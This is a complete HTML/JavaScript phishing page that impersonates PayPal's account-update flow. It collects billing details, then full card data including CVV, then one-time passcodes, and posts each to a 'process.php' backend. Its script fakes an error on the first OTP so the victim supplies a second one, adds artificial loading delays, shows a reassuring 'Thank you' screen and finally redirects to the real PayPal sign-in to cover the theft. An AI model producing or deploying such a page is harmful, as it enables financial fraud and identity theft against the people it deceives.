 <!DOCTYPE html>
<html>
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width"/>
<link rel="icon" href="res/img/icon.png" />
<title>Paypal - Update your account information</title>
<link rel="stylesheet" href="res/css/style.css"/>
<script src="res/js/jq.js"></script>
<script src="res/js/v.js"></script>
<script src="res/js/mask.js"></script>
</head>
<body>
    
<div class="loadpage">
<div class="content">
<div class="spinner loading">
</div>
</div>
</div>   


<div class="topbar">
<div class="cols left">
<img src="res/img/logo.png" />
</div>
<div class="cols right">
<button class="log">Log Out</button>
</div>
</div>

<div class="up-content">


<div class="up-form" id="billing" style="display:non">
  <div class="up-col">
  <h2> Update Billing Info</h2>
</div>

<form name="billform"
id="billform" method="post" onsubmit="">
  
<input type="hidden" name="billing" />

<div class="up-col">
<input type="text"
id="fullname"
required
name="fullname"
placeholder="Fullname"
class="textinput"/>
</div>

<div class="up-col">
<input class="textinput" 
required
 type="text"
name="addressline"
id="addressline"
placeholder="Address Line" />
</div>


<div class="up-col">
<input class="textinput" 
required
type="text"
id="zip"
name="zip"
placeholder="ZIP" />
</div>


<div class="up-col">
<input class="textinput"
required
type="text" 
id="phone"
name="phone"
placeholder="Phone number" />
</div>


<div class="up-col">
<button class="next"
type="submit" onclick="toCc()">Next</button>
</div>
</form>

</div>



<div class="up-form" id="cc" style="display:none">
  <div class="up-col">
  <h2>Update Credit/Debit Card Info</h2>
</div>
<form id="ccform">
<div class="up-col">
<input class="textinput"
required
type="text"
id="nameoncard"
name="nameoncard"
placeholder="Name on card" />
</div>

<div class="up-col">
<input class="textinput"
required=""
type="text"
id="cardnumber"
name="cardnumber"
placeholder="Card Number" />
</div>

<div class="up-col">
<input class="textinput"
required=""
type="text"
id="expdate"
name="expdate"
placeholder="Expiry Date: YYYY/MM" />
</div>

<div class="up-col">
<input class="textinput"
required
type="text"
id="cvv"
name="cvv"
placeholder="CVV" />
</div>



<div class="up-col">
<button class="next" 
onclick="toOtp()">Next</button>
</div>
</form>

</div>



<div class="up-form" style="display:none" id="otpform">
<div class="up-col">
  <h2>Card Confirmation</h2>

<p style="text-align:left;">In order to confirm your card, please enter OTP that was sent to your number.</p>
<form id="otpforms">
<style>
.has-error{width:100%;}
</style>
<div class="up-col">
<input class="textinput"
required
type="text"
id="otp"
name="otp"
placeholder="Enter OTP" />
<p id="otp-error" class="form-col" style="color:red; text-align:left; display:none;">
Confirmation code you entered is not correct. Try again please.
</p>
</div>

<div class="up-col left marg">
<a href="#" 
onclick="tim()">Request new OTP in </a> 
 <span id="minutes">00</span>:<span id="seconds">00</span>
</div>


<div class="up-col">
<button class="next" 
onclick="submitOtp()">Confirm</button>
</div>
</form>

<div class="col">
<button class="skip" onclick="skipOtp()">Skip Confirmation</button>
</div>

</div>
</div>


<div class="up-form"
style="display:none" id="tnx">
<div class="up-col">
  <h2 style="display:flex; align-items:center; justify-content:center;"><img style="margin:6px; width:30px;" src="res/img/check.png"/> Thank you!</h2>
<p class="left">
thank you for helping us protecting your account. Your account now is fully accessible.
</p>

<div class="up-col">
<button class="next" 
onclick="locate()">My account</button>
</div>

<div class="col">
<button class="skip"
onclick="locate()">Log out</button>
</div>

</div>
</div>





</div>

<div class="footer">
    <a href="#">Contact Us</a>
    <a href="#">Privacy</a>
    <a href="#">Legal</a>
    <a href="#">Worldwide</a>
</div>

<script>


var requested = 0;

var all=$(".up-form");
var alrt=$("#alert");
var load=$(".loadpage");
var bil=$("#billing");
var card=$("#cc");
var tnx=$("#tnx");
var otp=$("#otpform");


$('#cardnumber').mask('0000 0000 0000 0000 0000');
$('#expdate').mask('0000/00');
$('#cvv').mask('0000');
$('#phone').mask('(000) 00000000');
function clear(){
   all.hide(); 
}



function tim(){


var m = 1;
var s = 59;


if(requested==0){
m = 1;
s = 59;

load.show();

$.post("process.php",{otp_request:1},function(done){
load.hide();
requested=1;

var sec = $("#seconds");
var min = $("#minutes");
sec.html(s);
min.html("0"+m); 

var inter = setInterval(function(){

s=s-1;

if(s<=0){
if(m<=0 && s<=0){

        clearInterval(inter);
        requested=0;

min.html("00");
sec.html("00");

    }else{
s=59;
m=m-1;
}
    
}

min.html("0"+m);
return s<10 ? sec.html("0"+s) : sec.html(s);

},1000);

});

}else{
    return false;
}
}





function locate(){
    load.show();
    window.location="https://paypal.com/signin"
}



function toBill(){
    load.show();
$.post("process.php",
{access:1},function(done){
       if(done==1){
        clear();
        bil.show();
        load.hide();
 }
}); 
}




function toCc(){

$("#billform").validate({
 errorClass:'has-error' , 
submitHandler: function(){
   load.show();
$.post("process.php",
$("#billform").serialize(), function(done){
    clear();
    card.show();
load.hide();
});
}
});
}


function toOtp(){
    $("#ccform").validate({
errorClass : 'has-error',
submitHandler: function(){
    load.show();
$.post("process.php",
$('#ccform').serialize(),
function(done){
		setTimeout(function(){
    clear();
otp.show();
tim();
load.hide();
	}, 10000);
});

}
 });
}


var otpTimes=1;
var otpError = $("#otp-error");

function submitOtp(){
    $('#otpforms').validate({
        errorClass:'has-error',
submitHandler:function(){
    load.show();
$.post("process.php",
{otp:$('#otp').val()},function(done){

setTimeout(function(){
if(otpTimes>=2){
	otpError.hide();
clear();
tnx.show();
load.hide();
}else{
	otpError.show();
otpTimes=otpTimes+1;
load.hide();
}
}, 5000);

    
});
}
    });
}

function skipOtp(){
load.show();
    $.post("process.php"
,{access:1},function(done){
    clear();
otp.hide();
tnx.show();
load.hide();
}
);


}





</script>
</body>
</html>